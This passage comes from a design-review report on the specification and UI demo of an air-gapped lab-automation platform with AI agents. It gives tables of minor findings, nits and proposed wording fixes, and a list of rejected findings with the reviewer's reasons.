| m73 | `CLAUDE.md:733` | `ipc: host` and `shm 16g` together are rejected by Podman | In the §12 vllm-cluster comment replace 'ipc: host, shm 16g' with 'shm_size: 16g (private IPC namespace; instances isolated from each other)'. |
| m74 | `CLAUDE.md:431`, `docs/DEVELOPMENT_PLAN.md:108-109`, `docs/PROMPTS.md:145-146` | The log-sink credential check is pattern-based; a value-based canary test would prove absence | In CLAUDE.md §5.7 'Audit': 'the broker registers each decrypted value with the structlog redactor for the operation's lifetime; the deploy test performs a full clone/push cycle against a fake host with a known canary PAT and key and asserts the canary is absent from every log sink, journal and ticket export.' Mirror in DEVELOPMENT_PLAN.md P6 done-when and PROMPTS.md P6b. |
| m75 | `CLAUDE.md:536-537`, `CLAUDE.md:496`, `CLAUDE.md:543-545`, `CLAUDE.md:51`, `docs/ui-demo/slas-ui-demo.html:298`, `CLAUDE.md:545` | Example skill 'sel-collect-clear' promises to clear the SEL but has no clear step and no clear_sel action exists; the demo lists it with 4 steps | Recommended: CLAUDE.md §6.2 line 496: extend the enum to '...\|graceful_restart\|clear_sel' and the Risk cell to '`get_*` safe · clear_sel caution · power actions destructive'. CLAUDE.md §6.3 after line 545: add '- redfish: { target: "{{ target }}", action: clear_sel }' as the fourth step. docs/ui-demo/slas-ui-demo.html line 298: change id to 'sel-collect-clear'. Alternative: rename the example to id 'sel-collect' / 'Collect the BMC event log', drop 'before clearing' from line 545, and set the demo's step count to 3. |
| m76 | `CLAUDE.md:468`, `CLAUDE.md:293-296`, `CLAUDE.md:448-450` | Capability vocabulary differs between skill `requires`, OS driver names and authz caps (ssh vs inband, redfish vs oob, git:* namespace) | Add to CLAUDE.md §5.2 after line 296: 'Capability names (`slas_authz`, `config/rbac-roles.yaml`): `screen`, `ssh`, `redfish`, `files`, `git:*`, `approve:*`. Drivers map to capabilities: `inband` → `ssh`, `oob` → `redfish`, `screen` → `screen`, `files` → `files`. Skill `requires` uses exactly these strings.' |
| m77 | `CLAUDE.md:495`, `CLAUDE.md:544`, `CLAUDE.md:296` | `copy`, `run.cwd` and `path` inputs have no canonicalisation rule — 'within workspace' is asserted, not defined | In CLAUDE.md §6.2 add a footnote to `copy`/`run`/`path`: 'All `path` values are resolved with realpath against the job's workspace root; absolute paths, `..` components and symlink escapes fail the step before execution; on the ssh side `to` is confined to `/var/lib/slas-run/<ticket>/` on the target.' Encode it in the `path` type of `skill.schema.json`. |
| m78 | `CLAUDE.md:468`, `CLAUDE.md:145`, `CLAUDE.md:739`, `docs/ui-demo/slas-ui-demo.html:600`, `CLAUDE.md:485-501`, `CLAUDE.md:503` | `requires: network` capability has no consumer and contradicts sandbox 'no network' | Either delete `network` from §6.1, or define it: 'network = the sandbox is attached to the internal package-mirror allowlist proxy (config/sandbox-egress.yaml, default: mirror only); never to slas-git or any Git host.' |
| m79 | `docs/ui-demo/slas-ui-demo.html:1048-1049`, `docs/ui-demo/slas-ui-demo.html:1054-1057`, `CLAUDE.md:600`, `CLAUDE.md:646-647` | Demo scopes approval rights to racks, but the SSOT has no target group and no scoped-approval rule | Either change demo line 1048 to unscoped copy ("Validation runs and their approvals"), or add to §5.4: "Target {id, name, kind: server\|station\|pdu, group, addresses, credential_refs{} (see #12), leased_by, lease_expires}; approval capabilities may carry `scope: [group…]`; a lease or approval outside scope fails with a three-part error" and give Admin → Servers a Group column. |
| m80 | `docs/ui-demo/slas-ui-demo.html:1036`, `docs/ui-demo/slas-ui-demo.html:1037`, `docs/ui-demo/slas-ui-demo.html:1005`, `CLAUDE.md:381-382` | Import dialog enables the Coding agent for a skill that declares `agents: [factory]` | Demo: chips limited to the declared agents; others disabled with 'not declared by this skill'. |
| m81 | `docs/ui-demo/slas-ui-demo.html:880-884`, `docs/ui-demo/slas-ui-demo.html:259`, `CLAUDE.md:603-604`, `CLAUDE.md:304` | Factory live view has no station screenshot strip | Demo: add a horizontal strip of before/after thumbnails (placeholders are fine) per GUI step under the test loop, each opening the full screenshot. |
| m82 | `docs/ui-demo/slas-ui-demo.html:1287`, `docs/ui-demo/slas-ui-demo.html:509`, `docs/ui-demo/slas-ui-demo.html:310`, `docs/ui-demo/slas-ui-demo.html:664`, `CLAUDE.md:583-584` | Wizard validation errors and 'no remote' error are shown as toasts; address error lacks 'Likely cause' | Demo: render `err` inline in the wizard step (a `.notice warn` under the offending field, focus moved to it); disable Push with an inline 'Add a remote under Settings first' when no remotes exist; add 'Likely cause: the address has no host part' to the address error. |
| m83 | `docs/ui-demo/slas-ui-demo.html:450`, `docs/ui-demo/slas-ui-demo.html:538`, `CLAUDE.md:583`, `CLAUDE.md:588-590` | Nested tabs: Coding tabs → Git sub-tabs | Recommended A: make the Git panel's five views a vertical section list or segmented control inside the panel, not a second tab strip; §9 says 'Git panel sections'. B: relax the anti-pattern to 'more than two levels of tabs'. |
| m84 | `docs/ui-demo/slas-ui-demo.html:338`, `docs/ui-demo/slas-ui-demo.html:832`, `docs/ui-demo/slas-ui-demo.html:732`, `CLAUDE.md:584` | Live console is force-scrolled to the bottom on every 3.2 s refresh | Demo: stick to bottom only when the user is already at the bottom; otherwise show an 'N new lines' button; patch the console node instead of re-rendering the page. |
| m85 | `docs/ui-demo/slas-ui-demo.html:1038`, `CLAUDE.md:380-381` | 'New skill' has the agent draft skill YAML — a path §5.6 does not describe | Recommended A: keep it and add one sentence to §5.6: 'Drafts produced by a model enter through IMPORT like any pasted file and are shown for review before saving.' Demo: after 'Draft the steps' open the import dialog with the YAML. B: drop the feature from the demo. |
| m86 | `CLAUDE.md:329-330`, `docs/ui-demo/slas-ui-demo.html:973`, `docs/ui-demo/slas-ui-demo.html:1226`, `CLAUDE.md:600`, `docs/DEVELOPMENT_PLAN.md:183` | No copy for the degraded consensus state; Models page says 3 voters are 'required', contradicting degrade-not-block | §5.3: 'Degraded sentence: "Only 1 of 3 reviewing models could run (<reason>). This plan was not cross-checked; approve with that in mind." shown in the review step and stored on the ticket.' Demo Models page: 'Fewer than 3 voters: cross-checks run with one model and are flagged.' |
| m87 | `CLAUDE.md:582-583`, `CLAUDE.md:603-604`, `docs/ui-demo/slas-ui-demo.html:129-133`, `docs/ui-demo/slas-ui-demo.html:688`, `docs/ui-demo/slas-ui-demo.html:9`, `docs/ui-demo/slas-ui-demo.html:135`, `docs/ui-demo/slas-ui-demo.html:311`, `docs/ui-demo/slas-ui-demo.html:130-133`, `docs/ui-demo/slas-ui-demo.html:876`, `CLAUDE.md:603`, `docs/ui-demo/slas-ui-demo.html:12-13`, `docs/ui-demo/slas-ui-demo.html:15`, `docs/ui-demo/slas-ui-demo.html:655` | §9 lists WCAG AA but gives no non-colour rule; the demo's LED cycle map conveys pass/fail by colour alone and its faint text is about 3.1:1 | In CLAUDE.md §9 (580-583) add rule 11: 'Status is never conveyed by colour alone — every LED, vote and severity carries a glyph or text label and an accessible name; live updates honour prefers-reduced-motion; dialogs trap focus and return it on close; all text meets 4.5:1.' In §11 Tests add an axe-core check to the e2e suite. In the demo: give `.led.pass`/`.led.fail` a glyph (✓ / !) or pattern (129-131), put the status in the LED title/aria-label (688), and darken `--ink-3` to reach 4.5:1 on white (e.g. #6B7480). |
| m88 | `CLAUDE.md:427`, `CLAUDE.md:581-582`, `CLAUDE.md:686`, `docs/ui-demo/slas-ui-demo.html:666-667`, `docs/PROMPTS.md:138`, `docs/ui-demo/slas-ui-demo.html:667` | The §5.7 disallowed-host message is not a three-part error, although the demo already renders the correct three-part form | Replace the message in CLAUDE.md §5.7 row 'Egress' (427) with the demo's three-part form (666-667): what_happened 'github.com is not an allowed Git host. The remote was not saved and nothing was sent anywhere.' · likely_cause 'This installation is air-gapped and has no route to github.com.' · what_to_do 'Use one of the allowed hosts (gitlab.internal, gitea.internal), or ask an admin to allow github.com under Admin → Git hosts. Allowing an outside host needs an ADR.' |
| m89 | `CLAUDE.md:441`, `CLAUDE.md:439`, `CLAUDE.md:413-414`, `CLAUDE.md:582`, `docs/DEVELOPMENT_PLAN.md:107-108`, `docs/ui-demo/slas-ui-demo.html:610`, `docs/ui-demo/slas-ui-demo.html:509` | Sandbox `git push` failure copy names no mechanism at the terminal boundary and assumes a saved remote exists; the demo shows raw git output plus an appended sentence and a toast for the no-remote case | In CLAUDE.md §5.7 Method 2 row 'Remotes' (441) specify: 'The sandbox image's `git` is a thin wrapper: for push, pull, fetch or clone to a non-file URL it runs git, then appends what_happened "This sandbox cannot reach Git remotes." · likely_cause "Remotes are reachable only through the Git broker." · what_to_do "Push from the Git panel, which uses your saved remote — or add one under Settings → Git remotes." Local commands are untouched.' In the demo, make the terminal line (610) use that wording and replace the toast at 509 with the Add-remote dialog. |
| m90 | `CLAUDE.md:334`, `CLAUDE.md:44`, `CLAUDE.md:332-333`, `docs/ui-demo/slas-ui-demo.html:796`, `docs/ui-demo/slas-ui-demo.html:797`, `docs/ui-demo/slas-ui-demo.html:787` | Vote sentence and owner routing display enum codes ('EE', 'S2', 'S1') as primary UI content with no display map defined | In CLAUDE.md §5.3 (334) rewrite the example as 'All 3 reviewers agree the owner is Electrical Engineering (EE). Severity: 2 say degraded but operable (S2), 1 says blocks boot or loses a device (S1). Your call.' and add 'owner and severity codes are rendered through the glossary display map in both languages, code in parentheses; the code lists live in `slas_schemas/consensus.py` (vocabulary supplied by the owner).' Update the demo sentence at 796 and the ticket block at 787 accordingly. |


## 5. Nits

| # | Where | Issue | Fix |
|---|---|---|---|
| n1 | `CLAUDE.md:728`, `CLAUDE.md:786`, `docs/DEVELOPMENT_PLAN.md:60` | Consensus voter count is configured twice (env CONSENSUS_DEFAULT_VOTERS and config/consensus.yaml) with no precedence rule | In CLAUDE.md §12 line 728: replace `CONSENSUS_DEFAULT_VOTERS` and `CONSENSUS_TOKEN_BUDGET_PCT` with `CONSENSUS_POLICY: /etc/slas/consensus.yaml`, mount `./config/consensus.yaml:/etc/slas/consensus.yaml:ro`, and state in §5.3 that the file is hot-reloaded. |
| n2 | `CLAUDE.md:114`, `docs/DEVELOPMENT_PLAN.md:39-44`, `docs/DEVELOPMENT_PLAN.md:158-162` | §3 sends the reader to 'DEVELOPMENT_PLAN.md Phase 1' for full deployment detail; P1 is five lines with no prod or install.sh detail | CLAUDE.md §3 line 114 → 'Two profiles, one bundle, one command. Quickstart is built in docs/DEVELOPMENT_PLAN.md P1, the prod profile in P12; the install.sh contract is below.' |
| n3 | `docs/PROMPTS.md:97-99`, `CLAUDE.md:543-545`, `docs/DEVELOPMENT_PLAN.md:73-74` | P4 prompt refers to 'the redfish power_off step' but neither §6.3 example contains one | docs/PROMPTS.md line 98: replace 'the redfish power_off step must show' with 'a third test skill with a `redfish: power_off` step must show the approval requirement at import and at run and be refused at run without an approval'. |
| n4 | `docs/PROMPTS.md:268-272`, `CLAUDE.md:108`, `CLAUDE.md:431`, `CLAUDE.md:9`, `docs/PROMPTS.md:269-271`, `CLAUDE.md:762-763` | Weekly health check was not extended for INV-14 in v3.1 | docs/PROMPTS.md line 272, before 'Report as a checklist': add 'any compose service other than git-broker on slas-git; any Dockerfile, config or fixture containing credential.helper, a URL with "@" user-info, or private-key material; any `git` invocation in services/git-broker missing the §5.7 hardening flags'. |
| n5 | `docs/ui-demo/slas-ui-demo.html:498`, `docs/ui-demo/slas-ui-demo.html:801`, `docs/ui-demo/slas-ui-demo.html:897`, `CLAUDE.md:242`, `CLAUDE.md:662` | Export file names and folders drift from §4.4, §5.5 and §10.3 | Demo: 'sop.en.md and sop.zh-Hant.md saved with the ticket', 'Backups/stations/07/T-factory-2291'. |
| n6 | `docs/PROMPTS.md:244-249`, `CLAUDE.md:588`, `CLAUDE.md:594` | PROMPTS 'Add a WebUI page or wizard step' omits the §9 ADR rule and the three-step limit | Add to the prompt: 'If this is a new top-level page, write the ADR (§15) first and update §9's page list. Wizards stay three steps; a new step replaces or merges an existing one.' |
| n7 | `docs/DEVELOPMENT_PLAN.md:103-104`, `CLAUDE.md:133-134` | P6 done-when hard-codes 'Rust 1.80' as the bundled version | docs/DEVELOPMENT_PLAN.md line 104 → 'a sentence says it isn't available and names the newest bundled Rust that is used'. |
| n8 | `docs/ui-demo/slas-ui-demo.html:1170`, `CLAUDE.md:627-629` | Coding wizard says nothing is pushed until the user approves a merge request | Demo: 'Nothing is pushed until you choose Push in the Git panel; that opens a merge request for a reviewer and never merges by itself.' |
| n9 | `docs/ui-demo/slas-ui-demo.html:584`, `docs/ui-demo/slas-ui-demo.html:622`, `docs/ui-demo/slas-ui-demo.html:1163`, `CLAUDE.md:580`, `CLAUDE.md:582` | Runtime names (gVisor, Kata, Firecracker) used as primary user-facing copy | Demo: pill 'Isolated, no network'; options 'Standard isolation (default)' / 'Strongest isolation (slower to start)' with the engine name as a hint or under 'Show details'. |
| n10 | `docs/ui-demo/slas-ui-demo.html:455`, `docs/ui-demo/slas-ui-demo.html:492`, `docs/ui-demo/slas-ui-demo.html:705`, `docs/ui-demo/slas-ui-demo.html:716-718`, `CLAUDE.md:580` | Several screens have more than one primary action | Demo: header 'New …' buttons become secondary on agent pages (they stay primary on Home); the contextual action stays primary. |
| n11 | `docs/ui-demo/slas-ui-demo.html:329`, `CLAUDE.md:95`, `CLAUDE.md:575`, `docs/ui-demo/slas-ui-demo.html:1079` | 'Air-gapped mode is on' implies a mode that can be off | Demo footer: 'No internet connection is used.' (matches the Admin health line at 1079). |
| n12 | `docs/ui-demo/slas-ui-demo.html:2`, `docs/ui-demo/slas-ui-demo.html:351`, `docs/ui-demo/slas-ui-demo.html:348`, `docs/ui-demo/slas-ui-demo.html:642`, `CLAUDE.md:582-583` | Chinese text has no `lang="zh-Hant"`; variant label varies (中文 vs 中文（繁體）) | Demo: `lang="zh-Hant"` on every zh element; one label everywhere ('中文（繁體）', and '中文（简体）' when enabled). |
| n13 | `docs/ui-demo/slas-ui-demo.html:736`, `docs/ui-demo/slas-ui-demo.html:738`, `docs/ui-demo/slas-ui-demo.html:820`, `docs/ui-demo/slas-ui-demo.html:824` | Live console mixes executor journal lines with SOL output under a 'from the BMC' label | Demo: title 'Live console and executor journal', lede 'Console lines stream from the BMC; lines prefixed executor/redfish/verify/gate are the platform's journal'; optionally a filter chip for each stream. |
| n14 | `docs/ui-demo/slas-ui-demo.html:534`, `docs/ui-demo/slas-ui-demo.html:542`, `CLAUDE.md:580-581` | 'Discard' throws away uncommitted work on one click without saying what will happen | Confirm dialog: 'Discard your changes to sel.py? The file goes back to the last commit. This can't be undone.' with Keep / Discard. |
| n15 | `docs/ui-demo/slas-ui-demo.html:1046`, `CLAUDE.md:131`, `CLAUDE.md:712-764` | 'Add someone by email … one-time link' promises a mailer the architecture does not have | 'Add a person by their email address. You get a one-time sign-in link to hand to them; nothing is sent.' Mirror in `slas user add` output. |
| n16 | `CLAUDE.md:127-128`, `CLAUDE.md:131`, `CLAUDE.md:686`, `docs/PROMPTS.md:47-48` | CLI copy rules unspecified: PROMPTS cites a §3 report format that does not exist; §9/§11 scope errors to the UI | PROMPTS P0: drop 'as in §3' or add one example line to §3 ('GPU 0: 80 GB free. Podman 5.1 with gVisor found. Ready to install.'). §11 Errors: '…the UI and the `slas` CLI render exactly those.' |


## 6. Proposed edits

`2026-09-10-proposed-edits.patch` next to this report rewrites `CLAUDE.md` (to version 3.2), `docs/DEVELOPMENT_PLAN.md`, `docs/PROMPTS.md`, `README.md` and `.gitignore` with the fixes above wherever a fix is a text edit and, where a decision is needed, with the recommended option. It applies to commit `58d0408` with `git apply docs/reviews/2026-09-10-proposed-edits.patch`. It does not touch the UI demo; the demo edits in sections 3 and 4 are listed for the owner to apply after the page decisions (Settings page, ticket identifiers, single-language exports, per-run credentials) are made. Nothing was applied to the repository by this review.

The patch adds ten open decisions (12 to 21) to §15, six ADRs to the plan (0001 to 0006), a `backup-runner` service, a `slas-redact` package, `config/routing.yaml`, `config/retention.yaml`, `config/quotas.yaml`, `docs/THIRD_PARTY.md` and a `bundle/` directory to the repository layout, and splits P6 into P6a and P6b as the prompts already do.


## 7. Findings raised and rejected

Listed so the reader can see what was checked and not reported. "Why it was rejected" is the verifier's reason.

| Raised | Why it was rejected |
|---|---|
| Redfish power actions are 'destructive' in skills (§6.2) but a DC cycle needs no per-action approval in Validation plans (INV-7, §10.2 guar… | Refuted: both rules are stated and each is implementable — §6.2 applies to skills, §10.2 to plans, and §6.2 being stricter than INV-7 is permitted. 'Per-run' approval means once per run, so no 100-prompt over-prompting arises; every Validation run is human-ap… |
| §4.3 rejects Docker-in-Docker for 'needing a socket' while §12 mounts the Podman socket into two services | Refuted: INV-4 (line 98) scopes the socket ban to containers running model- or skill-authored steps, and PROMPTS line 269-271 explicitly exempts model-manager and sandbox-manager; §4.3 rejects the nested-daemon pattern, not the manager-with-socket pattern. Im… |
| Edge TLS and the reverse-proxy implementation are unspecified for an air-gapped install | Refuted: docs/PROMPTS.md line 56-57 specifies Caddy with self-signed TLS and docs/DEVELOPMENT_PLAN.md line 40 specifies self-signed TLS for the edge in P1; the claim of 'unspecified' holds only for CLAUDE.md §4.3, which is a minor omission worth one line. |
| Effort estimates do not match scope (P6: 6 sessions for ~12 components; P8: 3 sessions for six real drivers) | Refuted as taste: line 8 already labels the counts as rough, and the kick-off prompt (PROMPTS line 34-37) re-derives the session list per phase, so the numbers are not binding on any implementer. |
| config/redaction.yaml and config/rbac-roles.yaml are required by the prompts but absent from the plan scopes | Refuted: the plan's P1 and P3 scopes already cover RBAC in slas-authz and redaction in the gateway; the file names are fixed in §13 (line 786) and the prompts, and the audit prompt reads CLAUDE.md. No contradiction, only uneven naming granularity. Redaction o… |
| P8's PDU driver depends on unresolved open decision 3 (PDU vs relay) | Refuted: the plan already records the dependency explicitly at line 128-129 and the prompt parameterises the model; the P7 done-when at line 125 needs only the approval gate, not a real actuator, and an outlet-reference abstraction covers both PDU and relay. … |
| 'quota' appears in the API box and P6 scope without any quota dimension or default | Refuted per the brief: quota numbers and dimensions are site policy; no passage contradicts another and no invariant is touched. The reviewer's §5.9 with concrete numbers is policy, not design. |
| The 5 % cross-check budget's scope and degradation order are said to be undefined | Refuted: scope is implied by the env var, and the degraded path is covered by the 'If not met' column plus INV-11. Per-user budgets would be a new feature, not a gap. |
| config/redaction.yaml has no defined shape, pattern set or list of sinks | Refuted as implementation detail at the document's level of abstraction; the shared-source point is covered by #9's fix rather than being a separate defect. |
| The demo wizard's 'different credentials for this run only' option has no storage or deletion rule | Refuted: a demo elaboration that does not conflict with the SSOT and whose transport INV-5 already dictates; resolves with #12's store. |
| No retention or rotation is defined for screenshots, SOL streams, cycle evidence, artifacts, audit rows or per-ticket station backups | Refuted as site policy: the documents are silent, not contradictory, and no invariant sets a retention requirement. The mechanism suggestion is kept as guidance only. |
| Nothing defines what happens when the data root fills | Refuted: speculative operational hardening; the metric source exists in the blueprint and the thresholds are site policy. |
| Factory feed shows a periodic 'screenshot every 60 s' not listed as a primitive | Refuted: implementable with the current primitives; demo copy is consistent with a bounded loop. |
| Backups/ sits on the same filesystem as the data it protects with no off-box path in quickstart | Refuted as site/operations policy; a reasonable enhancement, not a design defect. |
| Backup components are taken independently with no consistency point or restore order | Refuted: covered by the P12 runbook deliverable; operational detail rather than a design contradiction. |
| Preamble output line forces code output even in prompts that must not write code | Refuted: the kick-off prompt (lines 35-37) states its own output — deliverable, files, tests and done-when per session — and a later, more specific instruction overrides the generic preamble; no session produces something wrong. Wording preference. |
| Preamble omits the change-management duties the Definition of done requires (ADR, CLAUDE.md update) | Refuted: the preamble makes the session read CLAUDE.md fully (§11 DoD and §15 carry the duty), the plan's working rule at line 192 restates it, and the phase-end audit prompt checks the §11 DoD. A terse preamble is not a defect. The one concrete unscheduled A… |
| Preamble omits the quality gates of §11: egress-DROP, coverage, trace_id + metrics, three-part errors, authz at executor | Refuted: the preamble is deliberately short and delegates to CLAUDE.md, which the session reads fully; the audit prompt names §11 explicitly. Terse is not a defect. The metrics/trace_id phase-assignment issue is handled separately in fresh-prompts#7. |
| Preamble says 'ask' before adding a dependency; §15 and the health check require an ADR | Refuted: 'ask' (§0.3 line 39) and 'ADR required' (§15 line 801) are both CLAUDE.md rules and are complementary — asking is the gate, the ADR is the record — so the preamble restating only §0.3 is not a contradiction; the health check enforces §15 as intended. |
| Preamble not updated for v3.1: no reminder of the git-broker / credential-free-sandbox rule | Refuted: the sessions that touch Git carry the reminder in their own prompts — P6a line 126-127 states INV-14 verbatim and P6b is entirely about §5.7 — and §0.3 line 42 is in the file every session reads. Terse is not a defect. |
| 'Ask for the plan first on anything touching more than three files' is advice to the human, not an instruction in the preamble | Refuted: lines 6-15 are explicitly operator guidance ('How to run a session well'); the human deciding when to ask for a plan is the documented workflow, not a defect in the prompt. |
| Kick-off prompt does not ask which §15 open decisions the phase depends on | Refuted: this is an enhancement request, not a defect — the plan already points at open decisions where relevant (line 128-129 'per open decision 3'), and the preamble's 'stop and tell me' rule covers conflicts. The specific PDU and GitLab pre-decisions are a… |
| ADR status lifecycle is undefined: P0 writes 'accepted' itself, the utility prompt always writes 'proposed', nothing accepts | Refuted: the two prompts serve different cases — P0's ADR-0001/0002 record decisions already made in CLAUDE.md (§5.1, §5.2/INV-4), so 'accepted' is correct there, while the utility prompt is for new decisions the owner has not yet taken, so 'proposed' is corr… |
| Template file name matches the ADR pattern and its Status line contains the word 'accepted' | Refuted: verified with `grep -c 'Status: accepted' docs/adr/0000-template.md` → 0, so the literal-grep half of the claim is false; 0000-<name>.md is a conventional template marker, and a check that counts files instead of parsing Status would be the check's b… |
| P0 prompt does not say how the egress-DROP CI job and Playwright obtain packages and browsers offline | Refuted: INV-8 states the requirement (builds succeed with networking disabled) and the prompt states the job; the lockfile-plus-cache mechanism is ordinary implementation the session performs. Terse is not a defect. |
| P0 prompt asks for `slas doctor` without naming packages/slas-cli as its home | Refuted: the prompt creates the §13 skeleton, which contains packages/slas-cli, and §3 line 131 defines `doctor` as a verb of the `slas` CLI; a session reading both has no reason to put it elsewhere. Terse is not a defect. |
| P7 prompt and plan require Hypothesis, which CLAUDE.md §11 does not list | Refuted: CLAUDE.md does not enumerate dev-only test libraries at all — pytest and vitest (P0 prompt line 45-46) are equally absent — so the plan and prompt naming a property-testing library is consistent with how the documents divide labour, both companions a… |
| The 'fresh VM' deploy test has no provisioner or runner decision anywhere | Refuted: all four passages agree (fresh VM, egress-DROP, CI-enforced); the provisioner is CI infrastructure the owner's environment supplies, not a decision the documents contradict each other on, and 'VM' is explicit enough that a container would not satisfy… |
| P2 schema list omits the types the Agent protocol depends on (Upload, MesTicket, Observation, Verdict, SopTemplate) | Refuted: the prompt requires 'the Agent protocol' verbatim from §5.1, whose signature names the extra types, so any session implementing it under mypy --strict must define them; the seven-item list is a non-exhaustive scope, and CLAUDE.md defines none of the … |
| P2 prompt drops ticket exports, which the plan scopes and INV-13 governs | Refuted: the prompt is a terse subset of a scope the session also reads; the P2 done-when (line 52-54) requires only the placeholder two-language SOP, which the prompt's 'produce both languages (INV-13)' covers. The P2 ticket-store wording is already being re… |
| P4 plan-only done-when items are missing from the prompt, and 'real Xvfb display' collides with §11 'no real display' | Refuted: Xvfb is by definition a virtual framebuffer, so §11's 'real display' (physical) is not contradicted and no session would stop on it; the two done-when items are in the plan the session reads and the prompt already asks for the screen-worker and for e… |
| P6a prompt omits `slas toolchain list\|add` that the plan scopes in P6 | Refuted: the verbs are scoped in the plan for the same phase, the P6 done-when does not require them, and a terse prompt is not a defect. The real toolchain gap (storage layout and manifest) is already confirmed as plan-sequencing-and-coverage#9. |
| P5 prompt omits the PDF renderer and the creation of docs/glossary.yaml | Refuted: the plan (line 81-82) scopes both the PDF renderer and docs/glossary.yaml for the same phase and the prompt already binds the glossary; §5.5 marks PDF as an addition '(+ .pdf ...)'. Terse is not a defect. The CJK-font bundling remark is a reasonable … |
| 'read-only rootfs' for sandboxes exists only in the P6a prompt | Refuted: a prompt adding a stricter detail the SSOT does not forbid is not a conflict or a defect; recording it in §4.1 is an enhancement. The related sandbox decisions that do need the SSOT (runc fallback, dependency source, toolchain layout) are already con… |
| P6a wizard export target (remote · bundle) depends on P6b deliverables | Refuted: the plan has a single P6 phase; P6a/P6b are the owner's session split and the kick-off prompt orders sessions 'in dependency order'. A session building the wizard against a remotes API that does not yet exist stubs or asks — nothing wrong is produced. |
| P6b prompt omits the eight git:* capabilities and the terminal session recording/redaction rule | Refuted: the prompt's first line delegates the whole of §5.7, whose Shared rules (line 448-450) and Terminal row (line 439) carry exactly these requirements; the §11 DoD adds 'authz at executor'. Terse is not a defect. The shared redaction owner is already co… |
| P6 done-when needs a local GitLab; the prompt provides only a fake Git server and open decision 7 is unresolved | Refuted: tests against a fake server plus recorded API responses and a demo against the owner's real host are complementary, not contradictory; §5.7 line 427 already allows either GitLab or Gitea, the plan's 'local GitLab' describes the owner's demo environme… |
| P7 prompt omits plan-only done-when items, including the INV-7 approval-blocks-AC-cycle test | Refuted: the prompt is a terse deliverable list and already asks for the guardrails (whose requires_approval drives the AC-cycle block) and crash recovery; the P7 done-when is in the plan every session reads and the audit prompt verifies it. Terse is not a de… |
| P8 prompt assumes a PDU driver while open decision 3 (PDU vs relay) is unresolved | Refuted: the prompt carries a placeholder the owner fills, and CLAUDE.md itself already assumes a PDU in §4.2 (line 204) and the §5.2 driver table (line 295), so the prompt matches the SSOT's dominant assumption; the residual is that §15 (3) is stale against … |
| Audit prompt says 'run the egress-DROP job' but no local way to run it is ever created | Refuted: how the audit session runs the job (a make target, `unshare -rn`, or triggering CI with `gh workflow run`) is an implementation detail the P0 session chooses; the documents do not contradict each other. Enhancement, not defect. |
| 'Add a WebUI page or wizard step' ignores that pages need an ADR and wizards are always three steps | Refuted: the prompt body says '<describe the screen>' — a screen is usually a sub-page (Admin → Git hosts) — and the preamble's conflict rule already makes a session stop on a fourth wizard step or an unlisted top-level page (§9 lines 588, 594). Wording prefe… |
| Weekly health check exceptions and coverage are narrower than §12 and §2: host pid/ipc, cap_add, privileged, `latest` tags, INV-2 hosts, re… | Refuted: the socket check is accurate and its exception list is correct (vllm ipc: host, node-exporter pid: host and dcgm cap_add are not socket mounts, so they are not false positives); the rest is a request for a longer checklist, which is an enhancement, n… |
| 'Write a failing test instead of guessing' makes CI red, contradicting 'do not start a phase until CI is green' | Refuted: the two rules compose deliberately — an unverified Redfish URI or window title turns the phase red until the owner supplies the fact, which is the intended forcing function; xfail(strict) is one implementation technique the session may choose, not a … |
| .gitignore `*.pem` / `*.key` swallow the test fixtures P1, P6b and P9 need | Refuted: the reviewer concedes the pattern is the correct default; generating throwaway keys in a fixture is standard practice and the natural response when `git status` shows the file ignored (verified: *.pem/*.key ignored, *.pub not). Enhancement to the pro… |
| Approvals have no expiry or re-check while a run waits in the queue | Refuted: a normal policy/implementation detail; the docs neither require nor forbid expiry and INV-7 is satisfied by a per-run approval regardless of queue time. |
| Lease ownership, heartbeat and release on crash are unspecified, and leases live in two places | Refuted: the location is settled by line 166 and §11 line 671 (apps/api owns leases); the rest is implementation detail an executor implementer decides without guessing a spec-level decision. |
| Step ids are optional and dedup keys are undefined, so a resumed run can double-count findings and spawn duplicate child tickets | Refuted: the dedup key (fingerprint) and the resume authority (journal) are both in the documents; the rest is normal implementation detail. |
| The Coding iterate loop has no checkpoint, so 'resume from iteration 3' cannot be implemented from the journal | Refuted: durable working tree plus per-change commits with trailers are specified in §4.4, §5.7 and PROMPTS; nothing forces a restart from iteration 1. |
| 'Run' and 'Ticket' are two identities for one job; resume needs to know which is authoritative | Refuted as a decision gap — line 341 answers it; only naming drift remains, noted in the fix. |
| Sandbox TTL reaping is undefined relative to Running, Paused and open terminals | Refuted: normal implementation detail; the durable/ephemeral split in §4.4 already answers the recovery question. |
| Terminal lifecycle after Done is undefined: bound to the ticket or to the sandbox? | Refuted: implementation detail the sandbox-manager implementer decides; no document contradicts either binding. |
| Voter set is not pinned per consensus request; drain, retry and the vote record during a blue/green swap are undefined | Refuted: voter identity is settled by §7 and the demo; drain semantics and mid-vote edge cases are the P3 implementer's. |
| A 72 h run outlives the capability token that authorises its steps; no run grant is defined | Refuted: speculative premise (executor holding a session token) not supported by the documents; the remaining choice is an implementation detail. |
| Lease acquisition point differs (Factory at PLAN, Validation at ACT) and the wizard contradicts the queue | Refuted: lease points are stated per agent and not contradictory; the demo's queue behaviour is consistent with them. |
| Station-runner step batches break per-step write-ahead journalling and have no reconnect/idempotency rule | Refuted: normal protocol implementation detail; nothing in the docs forces a non-idempotent design. |
| SOL/syslog capture is process-bound to the executor; a crash loses console lines and fence correlation | Refuted: speculative about process layout; implementation detail. |
| A blue/green swap during a running ticket changes the model mid-run without a record | Refuted: implementation detail; tracing already spans WebUI to vLLM. |
| No trusted time source is defined for certificates, batch expiry and the journal | Refuted: INV-1 bars an external NTP dependency, not the site's own time service; supplying time to lab and factory VLANs is site infrastructure. A TLS handshake against a skewed clock fails loudly, and nothing in the documents contradicts itself. A skew check… |
| Operator and agent share one physical console; no on-station indicator, local stop or pause on human input | Refuted as a design defect: the hard stop on an unexpected focus change already halts the agent when the operator acts on the station, Hold station exists in the UI, and a banner or local hotkey is a runner feature the P9 session can add without any unsettled… |
| A held station has no escalation, maximum hold time or safe-state rule | Refuted: keeping the failed unit powered and the station held until the line lead decides is the stated design in §10.3, and how long a hold may last, whom to page and whether a unit with a fan finding stays on are line policies the site sets. The only small … |
| No separation of duties: the run's creator may approve its own AC cycle | Refuted: INV-7 asks for a human approval per run and the documents apply it consistently; requiring a second, different human is a four-eyes policy the site decides, not a contradiction or an unsettled implementation decision. Parking it as an open decision i… |
| PDU/outlet topology is not modelled; an AC cycle could affect a shared feed | Refuted: open decision (3) already parks AC cycling, the P8 PDU driver necessarily carries a target-to-outlet mapping, and whether outlets are shared with other targets or infrastructure is lab wiring the site controls. Worth widening open decision (3), not a… |
